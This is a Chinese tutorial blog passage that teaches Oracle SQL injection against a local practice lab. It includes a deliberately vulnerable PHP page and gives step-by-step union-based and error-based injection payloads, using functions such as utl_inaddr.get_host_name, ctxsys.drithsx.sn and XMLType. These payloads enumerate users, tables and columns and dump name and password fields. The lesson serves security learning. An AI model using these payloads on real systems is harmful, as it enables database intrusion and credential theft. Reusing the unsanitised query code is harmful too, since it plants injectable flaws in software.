> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YMeBLq8IdC8XoS14sK6zNQ)

****前文介绍了虚拟机 VMware+Kali 安装入门及 Sqlmap 基本用法。这篇文章将跟着 Cream 老师兼好友学习，结合自己的经验详细介绍 Oracle 数据库注入漏洞和致命问题，包括各种类型的注入知识。注入漏洞是安全威胁中比较常见的漏洞，Oracle 也是用得最广的数据库，希望这篇文章对您有帮助。真心觉得 Cream 老师讲解非常厉害，也推荐大家去 i 春秋学习他的视频，且看且珍惜。****  

作者作为网络安全的小白，分享一些自学基础教程给大家，希望你们喜欢。同时，更希望你能与我一起操作深入进步，后续也将深入学习网络安全和系统安全知识并分享相关实验。总之，希望该系列文章对博友有所帮助，写文不容易，大神请飘过，不喜勿喷，谢谢！

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.html

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好或侵权的地方，可以联系我删除。基础性文章，希望对您有所帮助，作者目的是与安全人共同进步，加油~

文章目录：

*   **一. Oracle 基础介绍**
    
    1. 数据库介绍
    
    2.Oracle 安装配
    
    3. 常见注入类型
    
*   **二. Oracle 数据库元数据获取**
    
*   **三. 联合注入实践**
    
*   **四. 报错注入实践**
    
*   **五. 布尔盲注实践**
    
    1. 普通猜解
    
    2.DECODE 函数盲注
    
    3.INSTR 函数盲注
    
*   **六. 延时盲注实践**
    
*   **七. 带外注入实践**
    
*   **八. Oracle 自动化工具 SQLMAP 使用**
    
*   **九. Oracle 注入防御**
    

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。

一. Oracle 基础介绍  

1. 数据库介绍
--------

数据库的基本概念如下：

*   数据库（Database，DB）  
    按照数据结构来组织、存储和管理数据的仓库
    
*   数据库管理系统（Database Management System, DBMS）  
    是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，简称 DBMS
    
*   数据库管理员（ Database Administrator, DBA）  
    操作和管理 DBMS 的人员，简称 DBA
    

数据库通常分为两类：

*   关系型数据库  
    
    Oralce、DB2、MSSQL、SyBase、Informix、MySQL、Access、Postgresql 等，是指采用了关系模型来组织数据的数据库，其以行和列的形式（二维表）存储数据，以便于用户理解，关系型数据库这一系列的行和列被称为表，一组表组成了数据库、
*   非关系型数据库：  
    
    Redis、Mongodb、Nosql、Hbase 等，用于指代那些非关系型的，分布式的，且一般不保证遵循 ACID 原则的数据存储系统，如以键值对（Key-Value）存储，用于解决大数据应用难题和大规模数据集合多重数据种类带来的挑战。
    

这篇文章主要围绕 Oracle 数据讲解，也是企业用得最广泛地数据库。Oracle 数据库的特点如下：

*   全球化、跨平台的数据库
    
*   支持多用户、高性能的事务处理
    
*   强大的安全性控制和完整性控制
    
*   支持分布式数据库和分布处理
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGliaU56HaOa1aO5JyJCnkMQBgcQ5cRLibwkHicGSoZSVAUicCiaxiaSTJp6tRw/640?wx_fmt=png)

下面介绍 SQL 的分类，主要分为五大类，核心是对数据的增删改查。读者可以简单学习下数据库的基础知识。作者之前数据库的文章也介绍过。

*   DDL（数据定义语言）
    
*   DML（数据操纵语言）
    
*   TCL（事务控制语言）
    
*   DQL（数据查询语言）：数据库注入用得比较多
    
*   DCL（数据控制语言）：数据库赋权攻击用得比较多
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlNqxJIADeic0vicarVuPuia4hVoKIPyQv2GU0ngt7V1I9fY6hQVYxoLVRg/640?wx_fmt=png)

2.Oracle 安装配置
-------------

环境配置永远是第一步，这里简单介绍下配置过程，网上教程也比较多，前文作者也进行了详细介绍。Windows 安装 Oracle 的核心流程包括：

*   准备 Oracle 安装包
    
*   根据需求下一步安装
    
*   设置监听服务并启动
    
*   配置 TNS 和 Listener
    
*   解决 php 连接数据库的 OCI8 问题
    

透明网络底层（Transparence Network Substrate）通过读取 TNS 配置文件才能列出经过配置的服务器名，安装过程中建议关闭防火墙。详见上一篇文章：

*   [网络安全提高篇] 一〇四. 网络渗透靶场 Oracle+phpStudy 本地搭建万字详解
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlet8Ex0iblibvBoHH22VS16TK3kVh0XjviagWs0cPrLXaNpAZUdmianM4rg/640?wx_fmt=png)

前文已经将环境搭建成功，Navicat 连接数据库的信息如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl2CJnsALLpnVGDZAYxrUvRzIOcSrbsPLf2jibgYdjOY5QYic6V8zZRjUQ/640?wx_fmt=png)

创建的数据库主要包括一个 demo 表。

*   DEMO(ID, NAME, AGE, SEX)
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlGrzGsd0aUr5ysO8RyCOno95icxRiael8SXIfDiaWfz0wjCgwGVMYQkFPQ/640?wx_fmt=png)

然后 phpstudy 中包括一个 sql-test.php 文件，其基本路径如下：

*   D:\phpstudy\PHPtutorial\WWW
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlpxVGEEAPw6IfHIgpGxHYTK2sDQJmnsYVOhvDibTG34LTfTrE9f2V8cw/640?wx_fmt=png)

该 php 文件代码如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlBHghuOFKFgSqfK5yrqWCGxsp8InfAZbia8icsjw33yuNzbpLVLVahuHQ/640?wx_fmt=png)

其基本流程是连接数据库，然后进行 select 查询并将查询结果反馈到表格 table 中。我们先简单进行代码安全审计，发现问题如下：

*   参数用户可控
    
    $_GET[‘id’]：参数是由前端传递过来的，用户通过自定义可以控制该参数。
    
*   后台无过滤或者过滤不严谨
    
    $sql = “select * from demo where id=”.$id；没有进行过滤操作。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlibM8mt4VFnm4YzPsT8rq2bkY5I4yGME2f3jViaSgetvbPpwqKEoE0jRw/640?wx_fmt=png)

通过这两点漏洞就可以实现 SQL 注入。

```
<?php  header("Content-Type:text/html;charset=utf-8");  $id = @$_GET['id'];  //连接数据库的参数配置  $dbstr ="(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521))                 (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))";      //连接数据库，前两个参数分别是账号和密码  $conn = oci_connect('eastmount', '123456', $dbstr);  if (!$conn)  {    $Error = oci_error(); //错误信息    print htmlentities($Error['message']);    exit;  }  else  {    echo "<h3>Oracle 注入实验</h3>"."<br>";    //ocilogoff($conn);    echo $id."<br>";    $sql = "select * from DEMO where ID=".$id;  //sql语句    echo "SQL语句：".$sql."<br>";    $ora_test = oci_parse($conn, $sql);                 //编译sql语句     oci_execute($ora_test, OCI_DEFAULT);            //执行    echo "<h3>查询结果</h3>";    echo "<table border='1' width='400' bgcolor='#CCCCFF'>" ;    while($r=oci_fetch_row($ora_test))                 //取回结果     {       echo "<tr>";      echo "<th>ID号</th>";      echo "<th>名称</th>";      echo "<th>年龄</th>";      echo "<th>性别</th>";      echo "</tr>";      echo "<tr>";      foreach ($r as $item) {          echo "<td>".($item?htmlentities($item):"    ")."</td>";      }      echo "</tr>";    }    echo "</table>";  }  oci_close($conn);                                           //关闭连接?>
```

3. 常见注入类型
---------

在 Oracle 中常见的数据类型包括：

*   联合注入
    
*   报错注入
    
*   布尔盲注
    
*   延时盲注
    
*   带外注入
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl30kF7B5zBJ3ictNDibw2G9xH9utbGibf58WhzL6JdOuXPogGRhQIFP5eQ/640?wx_fmt=png)

二. Oracle 数据库元数据获取
==================

在进行 SQL 注入之前，我们需要了解和掌握 Oracle 数据库中不同表、不同字段的特性及用法，获取元数据就是基础知识，即获取行和列交叉的数据项。（注：不同数据库的元数据是需要大家去牢记或归纳的）

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlhz5vcQ5obxQZH3Q23aicZJ9ibLsJ3rDKc6erDUjk5Tw0wVYzUCWdHmicg/640?wx_fmt=png)

*   select * from v$version where
    
    rownum=1;
    
*   select * from
    
    product_component_version;
    
    获取数据库版本，注意 Oracle 中没有 version() 函数
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlXVY0XPib7pspkbgkyjQGRJysOyEKePRib21sTaIGjmzePMKxs5tIfvRg/640?wx_fmt=png)

Navicat for Oracle 中执行效果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlIJFqwl0DuO4O0kPcuhRp7RmmtQHrvRp7Ot7dJs0yL4AFJvxVu5kYLg/640?wx_fmt=png)

*   select username from all_users;
    
    查看所有用户
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlc9drlmpy4n0Mdq1a3nng4E3Ric4A3PonU8YE7SzoSwMxfiabzDreeR2g/640?wx_fmt=png)

*   select username from
    
    all_users order by username;
    
    查看所有用户名并排序
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlcG0icSgmbwss5xlqxkWfhGYYaIDibtxTZ5ibLPliamFhuEoYTdL42urXzg/640?wx_fmt=png)

*   select tablespace_name from user_tablespaces;
    
    查看所有的表空间
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGleNVAvo2RQ68VWslzjjfOZ1CMTCosYR8mXKUS4OCusMQTx1phB89TeQ/640?wx_fmt=png)

*   select table_name from user_tables;  
    查看当前用户下的所有表
    
*   select table_name from
    
    user_tables where rownum=1;  
    查看当前用户的第一个表，注意 Oracle 中没有 limit 关键词（MySQL）
    
*   select column_name from
    
    user_tab_columns where
    
    table_name=‘demo’;  
    查看当前用户的所有列，如查询 demo 表下的所有列
    
*   select object_name from user_objects;  
    查看当前用户的所有对象（表名称、约束、索引）
    
*   select * from session_roles;  
    当前用户的权限
    
*   select member from
    
    v$logfile where rownum=1;  
    服务器操作系统
    
*   select instance_name from
    
    v$instance;  
    服务器 sid
    
*   select sys_context(‘userenv’,
    
    ‘current_user’) from dual;  
    当前连接用户
    
*   select user from dual;  
    当前用户。注意：dual 是虚拟表，用来构成 select 的语法规则，Oracle 保证 dual 里面永远只有一条记录。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl8U67MufXJLnZJUvBu5LSnCXPMAqEAVqVUAibWWyVccwVO6up5N8CcHw/640?wx_fmt=png)

*   select distinct owner from all_tables;
    
    列出所有的数据库
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlNS6eLGXAmEHUMj3nia8UFpwZlgWnGajibyYg9LEHTmNwL6wY3b9PyO5Q/640?wx_fmt=png)

*   select table_name from all_tables;
    
*   select owner, table_name from all_tables;  
    列出所有的表名
    
*   select name from v$datafile;  
    定位文件
    

最后补充部分知识点：

(1) 核心字段包括：

*   information_schema（库）
    
*   columns（表）
    
*   table_schema
    
*   table_name
    
*   column_nam
    

(2) dual（虚拟表）常见操作：

*   当前用户  
    select user from dual;
    
*   调用系统函数  
    select SYS_CONTEXT(‘USERENV’,‘TERMINAL’) from dual; -- 获得主机名
    
*   获取序列的当前值以及下一个值  
    select seq.nextval from dual; -- 下一个序列 seq 的值  
    select seq.currval from dual;–获取当前 seq 的值
    
*   计算器  
    SELECT 1000*100 from dual;
    

三. 联合注入实践
=========

联合注入顾名思义，就是使用联合查询进行注入的一种方式，是一种高效的注入的方式。常见流程包括：

*   判断注入点
    
*   判断是整型还是字符型
    
*   判断查询列数
    
*   判断显示位
    
*   获取所有数据库名
    
*   获取数据库所有表名
    
*   获取字段名
    
*   获取字段中的数据
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlDkqtsNTtPmhtICwJHU46vubOyDkyUqhWTSzdRDb1l0o2flic9gibZ5Jg/640?wx_fmt=png)

**第一步，判断注入点。**  
判断注入点的方法很多，比如 show.php?code=1’ 加单引号，show.asp?code=2-1 减 1。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlUMwNcaNdU4Y6q6Q1e5E2yQicERichAMLmjzp6T0xGGyWRC6Abbaiciaqhg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlMmVWKgXyx7CNKiczKibuLgLF5ribvVmt9FONlLYRRs4Hfu7u3jk21KTDA/640?wx_fmt=png)

安全性高的网站通常会过滤特殊标点符号，并且防止出现减法这种正常访问现象。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlmBJ4SqbI4KpUdialKny375h63wxPEw1a4pia969sNhuOYOFFgCdqdUSQ/640?wx_fmt=png)

下面是一个经典的方法：

*   http://xxxxx/show.asp?code=1’ and 1=1 - - (正常显示)  
    对应的 SQL 语句：  
    
    select … from table where code=‘1’ and 1=1 - - and xxxx;
    

单引号 (’) 匹配 code='1，然后 and 连接，1=1 恒成立，注释 (- -) 掉后面语句。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlIdWyMbQ5lNHnQx2P7LlSLTVHow50UtoQIqr4qkrCsibPbse3pPon14Q/640?wx_fmt=png)

*   http://xxxxx/show.php?code=1’ and 1=2 - - (错误显示)  
    对应的 SQL 语句：  
    
    select … from table where code=‘1’ and 1=2 - - and xxxx;
    

单引号 (’) 匹配 code='1，然后 and 连接，1=2 恒错误，注释 (- -) 掉后面语句。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlunSpVQAKnh4EmAiaRB0t8c0b8y6Epwg64NRUp7RW7nr2pWzdmbOshAA/640?wx_fmt=png)

**第二步，判断数据库列数。**  
根据某列数据做排序，四列数据判断。

```
id=1 order by 4--
```

输出结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlwyUuEYbDyWqvJNYCkR2f1oEKACYkBvmOia2uCOx3tbqKfS7LhdJancg/640?wx_fmt=png)

如果填写 5 它会报错，从 1 开始遍历能判断该表包括 4 个字段

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlOYuZNetf5eX07RjfAJwO3bd5ZcpCRnq4dyibA5kglDI4u8ykI0ibb24w/640?wx_fmt=png)

**第三步，联合注入。**  
通过 union 将数据在前端显示，这里的数据（null）个数需和前面查询的内容一致（4 个）。SQL 注入中，通常会使用 null 占位。

```
-1 union select null,null,null,null from dual--
```

输出结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlutG1RI1YUia1WeTZyz3LPDOoghCVJiawgIibuaWzicCJ9RZthTcbVgLiamA/640?wx_fmt=png)

**第四步，判断每个字段数据类型。**  
这里选择数字 1 和字符 2。

```
-1 union select 1,'2',null,null from dual--
```

输出结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlHv8roYYJ4c0vy7f5slNocwAvBMCibtyXDSloP5WJj4UScTvy0BpP47Q/640?wx_fmt=png)

注意，这里数据库中名称设置为 Varchar 字符串类型，如果填写数字 2 会报错。我们需要找到字符串类型来显示后续联合注入输出的结果。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlCVLhiaRfwhwGag7pO3iat6zo0SpmLuujhibWWXX8XrjCtm84KLY4Fpibjg/640?wx_fmt=png)

**第五步，数据库信息收集。**  
通过 sys_context 函数查询当前用户的连接信息，并显示在第二列的数据中。

```
-1 union select 1, (select sys_context('userenv','current_user') from dual),null,null from dual
```

当前数据库的用户信息如下图所示：

*   EASTMOUNT
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlQ3qwrd1fnnZHaRa5u6eEpiahXqvrdOpD2j9pt1PASKmiaX5ibjbv4MRsQ/640?wx_fmt=png)

**第六步，爆数据库名。**  
数据库名可能很多，这里通过 rownum=1 限制显示一条内容。

```
-1 union select 1, (select owner from all_tables where rownum=1),null,null from dual--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlXlkwfEPv0Orh29sicvZQgD2kw3UoJPaQ0CTh37Yeu5icu9NObKRSa9DQ/640?wx_fmt=png)

**第七步，获取当前用户下的表。**  
从指定数据库中获取表信息。

```
-1 union select 1, (select table_name from user_tables where rownum=1 ),null,null from dual--
```

输出结果如下图所示，真实环境中我们通常需要找到用户表或管理员表，从而获取用户名及密码进行后续渗透。

*   DEMO
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl381vnt8paURQeT7MxqEHQEARIJn6Mz2EIMlicLp4ukD5ame0w9hKY8A/640?wx_fmt=png)

**第八步，获取当前数据库下的字段名。**  
获取数据库表下面的字段内容，表的名称为 “DEMO”。

```
-1 union select 1, (select column_name from user_tab_columns where table_name='DEMO' and rownum=1),null,null from dual--
```

获取 DEMO 表格的第一个一段，如下图所示为 ID。

*   ID
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGljPK5X06BNhqrYqjpZIEzP6ucOIn6ZjiaoLcRWbyiavodxe0cyqicWdZIg/640?wx_fmt=png)

如果我们想获取其他字段怎么办呢？通过将查询出的结果放到 not in 中即可，或者使用不等于（<>）。

*   select column_name from user_tab_columns
    
    where table_name=‘DEMO’ and rownum=1
    
    and column_name not in (‘ID’)
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlQlKUNUANsicZkt6EHtnjk5OiacBkfuoHKBia0QTzZ5jOKyR2Vef7ib5IvQ/640?wx_fmt=png)

**第九步，爆数据。**  
爆数据通常是用户名和密码，这里可以使用 CONCAT 拼接函数。如果密码被 MD5 加密，我们进行相关解密即可。

```
-1 union select null, (select CONCAT(NAME, AGE) FROM DEMO where rownum=1 ),null,null from dual--
```

最终输出结果如下图所示：

*   eastmount 28
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlt6ejfYGMwK9aj0naFGcswNSiaMd5t5NO8p128xC0fNGu6yhibSy3EFIg/640?wx_fmt=png)

我们同样可以获取其他表信息。

```
-1 union select null, (SELECT CONCAT("name","password") FROM STU where rownum=1 ),null,null from dual--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGluMuj7SIFVGiadtdRHvvukPaw1MkYpstyuczcXALDMKib4LiaVTezVUhLw/640?wx_fmt=png)

写到这里，联合注入就介绍完毕，希望对您有帮助！

四. 报错注入实践
=========

SQL 报错注入旨在利用数据库的某些机制，通过构造错误条件，使得我们想要的信息出现在报错信息中。不同类型数据库的报错注入如下：

*   MYSQL  
    主要利用报错函数，如 extractvalue、updatexml、floor 等  
    http://192.168.2.101/sqli-labs-master/Less-5/?id=2’
    
    and extractvalue(1,concat(0x7e,(database()),0x7e))%23+
    
*   MSSQL  
    使用比较运算符，如 [执行语句]>1、[报错语句]=1 等  
    http://192.168.23.132/less-1.asp?id=1’
    
    and (select @@version)=1–
    
*   ORACLE  
    同上，但是需要借助于某些函数，如 utl_inaddr.get_host_name、ctxsys.drithsx.sn、XMLType 等  
    http://192.168.1.6:81/orcl.php?id=1
    
    and 1=utl_inaddr.get_host_name(
    
    (select user from dual)) –
    

Oracle 报错函数及对应含义如下表所示：

*   dbms_xdb_version.checkin()
    
*   dbms_xdb_version.uncheckin()
    
*   dbms_xdb_version.makeversioned()
    
*   dbms_utility.sqlid_to_sqlhash()
    
*   UTL_INADDR.get_host_name()
    
*   UTL_INADDR.get_host_address()
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlLn7XkmIvdOibtxHdXIDuOSzmurDj185Dd1AjMJicSHxCgicmqHEKup5Lw/640?wx_fmt=png)

报错注入的核心流程如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlQBKD29pw6WxdLlP3pzEiaicLlocQW7dJ7YfKB8tLMwOTv9asK0KFx9ag/640?wx_fmt=png)

**第一步，判断注入点。**

```
1 and (select count (*) from user_tables)>0 --1 and (select count (*) from dual)>0 --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlYJHTgKOpic1zLfibJXBqL34ibWHgiajyW09jlBCfVn9z98nFADNc4daevw/640?wx_fmt=png)

**第二步，显错函数获取信息。**  
利用 utl_inaddr.get_host_name( ) 获取 ip 地址，但是如果传递参数无法得到解析就会返回一个 oracle 错误并显示传递的参数。

*   utl_inaddr.get_host_name( )
    

```
1 and 1=utl_inaddr.get_host_name((select user from dual))--
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlCnIKQicaGxZ7kbXXgnpnlaeBWjsuNerNIB69HTS9MuSia6GNViaDicsXVg/640?wx_fmt=png)

但作者的配置没有显示任何 ORA 报错信息，泪奔 o(╥﹏╥)o，后面文章我找 CTF 题目给大家模拟下，这里主要介绍 Cream 老师兼好友的分享。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlT0TevecwIhtFtu9Ato37YpfmSib8Xdials8iaNPtstTKnpe9svKUoNlHQ/640?wx_fmt=png)

这里我们利用 ctxsys.drithsx.sn() 函数查询关于主题（获取当前用户信息）的对应关键词时，报错信息会显示出第二个参数的结果。

*   ctxsys.drithsx.sn()
    

```
-1 and  1=ctxsys.drithsx.sn(1,(select user from dual)) --
```

也可以使用 XMLType() 函数实现，比如：

```
1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlRJVoQvjmfAdSTE5Zfoo2fqnCuG9hoXegCQ4OngFcnxnOyNX1vH4uYA/640?wx_fmt=png)

其他函数包括：

```
dbms_xdb_version.checkin()
and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null --
bms_xdb_version.makeversioned()
and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --
dbms_xdb_version.uncheckout()
and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --
dbms_utility.sqlid_to_sqlhash()
and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --
ordsys.ord_dicom.getmappingxpath()
and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user) --
decode()
and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual) --
```

注意：不会显示报错信息，需要通过页面来判断。当 substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据。类似盲注。

*   decode(条件, 值 1, 返回值 1, 值 2,
    
    返回值 2,… 值 n, 返回值 n, 缺省值)
    

```
SELECT ID,NAME,AGE,decode(SEX,1,'男'，0，'女') from DEMO;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl6qvumXooYHFlTiabrmEuS0eKmW2SLD3cGY3HzyHicDqqHN8Cx5v7ThvA/640?wx_fmt=png)

```
1 and 1=(select decode(substr(user,1,1),'A',(1/0),0) from dual) --1 and 1=(select decode(substr(user,1,1),'B',(1/0),0) from dual) --
```

上述测试结果为页面正常，不显示任何数据。

```
1 and 1=(select decode(substr(user,1,1),'T',(1/0),0) from dual) --
```

显示结果如下，说明当前用户的首字母是 T，代码 decode(substr(user,1,1), ‘T’, (1/0), 0) 中 substr(user,1,1)=‘T’ 时，就返回 (1/0) 的值，但是 0 不能为分母，所以报错！

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlxmVwqaOWzp1IJq1Yh4ibzFhF35ibM7fsmTNNAicjiaUJAiafNQmLjXAbTCw/640?wx_fmt=png)

**第三步，爆出当前数据库名。**  
使用 SQL 语句如下，其中 distinct 是去重，几个核心的表需要大家记住。

*   user_tab_columns
    
    保存当前用户的表、视图等
    
*   all_tab_columns
    
    帮助查询用户下的所有的表和列
    
*   all_tables
    
    显示与当前用户可访问的表
    
*   user_tables
    
*   显示当前用户拥有的表
    

```
select (select distinct owner from all_tables where rownum=1) from dual;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGl5w5LyuUcGvGhibhyq6xdLFJlk7cWKbawbRM80UVsL0q7gnd4v8CyYDw/640?wx_fmt=png)

对应的 SQL 注入链接如下，爆出当前用户下的表信息如下，SYS 是第一个，后续的表可以陆续爆出来。

```
1 and 1=utl_inaddr.get_host_name((select table_name from user_tables where rownum=1)) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlux6LgJ6LicJUichlXYTAE2LiaZZLZ4HAuupKMkEH3I8XF032Jia2qplpGA/640?wx_fmt=png)

**第四步，爆出当前用户下的表。**  
SQL 语句如下：

```
select table_name from user_tables where rownum=1;
```

输出结果如下图所示，可以看到 DEMO 表。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGloZfyzj8kOfRhIQNhgxgibStLG2ibm8FFjyT1vb9iaRoF3q1gwsVr2Pgpg/640?wx_fmt=png)

对应的 SQL 注入链接如下。

```
1 and 1=utl_inaddr.get_host_name((select table_name from user_tables where rownum=1)) --
```

该用户下的第一个表是 DEMO，爆出其他表的方法和前面类似，使用 not in 或不等于关键词。

```
1 and 1=utl_inaddr.get_host_name((select table_name from user_tables where rownum=1 and table_name <>'DEMO')) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlMnogwWDXtXCibM4UeqPicPIaswJuULhH3u2UCVyP2bRLpkBPQqlh8PxA/640?wx_fmt=png)

**第五步，爆破指定表下的列名。**  
假设现在作者想爆 FLAG 表下的列。SQL 语句如下：

```
select column_name from user_tab_columns where table_name='DEMO' and rownum=1;
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGltNiaKuic8lH6UWic07cSb4VKprzPpofJJnIVGa5iajLSPhzvLLw6JYWibLQ/640?wx_fmt=png)

对应的 SQL 注入链接如下：

```
1 and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name='FLAG' and rownum=1)) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlxWUnvpwXptOHHA8M0K1z2OZ6XKnRjSb9ho2WJ3Hq20AZvicfajkvmBg/640?wx_fmt=png)

第二个字段是 name，第三个字段是 pwd，最后的字段是 flag。

```
1 and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name='FLAG' and rownum=1 and column_name <>'id')) --1 and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name='FLAG' and rownum=1 and column_name not in ('id','name') )) --1 and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name='FLAG' and rownum=1 and column_name not in ('id','name','pwd') )) --1 and 1=utl_inaddr.get_host_name((select column_name from user_tab_columns where table_name='FLAG' and rownum=1 and column_name not in ('id','name','pwd','flag') )) --
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROqkDUBzQzZUJTRq29JLjGlZ9YSrrCmTdtcTic6k27tngSbHlw7Sw3InsfZPUoQQMKw5oFqHeLKhcA/640?wx_fmt=png)

**第五步，爆字段内容。**  
SQL 语句如下：

```
select (SELECT CONCAT("name","pwd") FROM FLAG where rownum=1;
```

